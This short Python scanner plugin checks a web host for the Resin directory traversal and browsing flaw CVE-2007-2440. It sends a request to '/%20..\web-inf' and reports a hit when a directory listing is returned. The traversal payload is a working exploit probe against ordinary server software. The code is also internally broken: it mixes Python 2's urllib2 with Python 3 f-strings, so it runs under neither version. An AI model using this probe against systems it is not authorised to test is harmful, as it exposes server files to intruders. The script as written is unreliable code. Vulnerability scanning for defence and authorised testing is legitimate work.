#coding:utf-8
#author:wolf@future-sec
import urllib2
def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))
    vul_url = url + '/%20..\\web-inf'
    try:
        res_html = urllib2.urlopen(vul_url,timeout=timeout).read()
    except:
        return 'NO'
    if "<h1>Directory of" in res_html:
        info = f"{vul_url} Resin File Read And Directory Browsing Vul CVE:2007-2440"
        return f'YES|{info}'
    return 'NO'